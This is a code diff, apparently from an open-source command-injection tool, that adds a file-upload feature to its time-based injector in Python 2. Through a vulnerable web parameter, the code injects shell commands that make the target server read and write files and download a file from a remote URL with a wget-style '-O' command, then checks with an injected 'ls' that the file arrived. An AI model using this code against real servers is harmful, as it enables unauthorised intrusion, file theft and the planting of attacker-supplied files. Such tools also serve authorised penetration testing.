@@ -16,6 +16,7 @@
 
 import os
 import sys
+import urllib2
 
 from src.utils import menu
 from src.utils import colors
@@ -33,6 +34,7 @@ def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,O
   # Read file
   if menu.options.file_read:
     file_to_read = menu.options.file_read
+    # Execute command
     cmd = "echo $(" + settings.FILE_READ + file_to_read + ")"
     check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
     shell = output 
@@ -46,6 +48,7 @@ def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,O
     else:
      sys.stdout.write("\n" + colors.BGRED + "(x) Error: It seems that you don't have permissions to read the '"+ file_to_read + "' file.\n" + colors.RESET)
      sys.stdout.flush()
+     
      
   #  Write file
   if menu.options.file_write:
@@ -65,10 +68,9 @@ def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,O
       
     if not settings.TMP_PATH in menu.options.file_dest:
       file_name = os.path.split(menu.options.file_dest)[1]
-      dest_to_write = settings.TMP_PATH +  file_name
+      dest_to_write = settings.TMP_PATH + file_name
     else:
       dest_to_write = menu.options.file_dest
-    cmd = settings.FILE_WRITE + " '"+ content + "' "
     
     # Check the file-destination
     if os.path.split(menu.options.file_dest)[1] == "" :
@@ -78,6 +80,9 @@ def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,O
     else:
       dest_to_write = menu.options.file_dest
     OUTPUT_TEXTFILE = dest_to_write
+    
+    # Execute command
+    cmd = settings.FILE_WRITE + " '"+ content + "' "
     check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
     shell = output
     shell = "".join(str(p) for p in shell)
@@ -93,7 +98,54 @@ def do_check(separator,maxlen,TAG,delay,http_request_method,url,vuln_parameter,O
       sys.stdout.write(colors.BOLD + "\n(!) The " + colors.UNDERL + shell + colors.RESET + colors.BOLD +" file was created successfully!\n" + colors.RESET)
       sys.stdout.flush()
     else:
-     sys.stdout.write("\n" + colors.BGRED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_write + "' file.\n" + colors.RESET)
+     sys.stdout.write("\n" + colors.BGRED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + colors.RESET + "\n")
      sys.stdout.flush()
 
+
+  #  Upload file
+  if menu.options.file_upload:
+    file_to_upload = menu.options.file_upload
+    
+    # check if remote file exists.
+    check_if_exists = urllib2.urlopen(file_to_upload)
+    if check_if_exists.code != 200:
+      sys.stdout.write("\n" + colors.BGRED + "(x) Error: It seems that the '"+ file_to_upload + "' does not exists." + colors.RESET)
+      sys.stdout.flush()
+      sys.exit(0)
+
+    if not settings.TMP_PATH in menu.options.file_dest:
+      file_name = os.path.split(menu.options.file_dest)[1]
+      dest_to_upload = settings.TMP_PATH + file_name
+    else:
+      dest_to_upload = menu.options.file_dest
+    
+    # Check the file-destination
+    if os.path.split(menu.options.file_dest)[1] == "" :
+      dest_to_upload = os.path.split(menu.options.file_dest)[0] + "/" + os.path.split(menu.options.file_upload)[1]
+    elif os.path.split(menu.options.file_dest)[0] == "/":
+      dest_to_upload = "/" + os.path.split(menu.options.file_dest)[1] + "/" + os.path.split(menu.options.file_upload)[1]
+    else:
+      dest_to_upload = menu.options.file_dest
+    OUTPUT_TEXTFILE = dest_to_upload
+    
+    # Execute command
+    cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload
+    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+    shell = output
+    shell = "".join(str(p) for p in shell)
+    
+    ## Check if file exists!
+    cmd = "echo $(ls " + dest_to_upload + ")"
+    check_how_long,output = tfb_injector.injection(separator,maxlen,TAG,cmd,delay,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,alter_shell)
+    shell = output
+    shell = "".join(str(p) for p in shell)
+    if shell:
+      if menu.options.verbose:
+	print ""
+      sys.stdout.write(colors.BOLD + "\n(!) The " + colors.UNDERL + shell + colors.RESET + colors.BOLD +" file was created successfully!\n" + colors.RESET)
+      sys.stdout.flush()
+    else:
+     sys.stdout.write("\n" + colors.BGRED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + colors.RESET + "\n")
+     sys.stdout.flush()
+     
 # eof
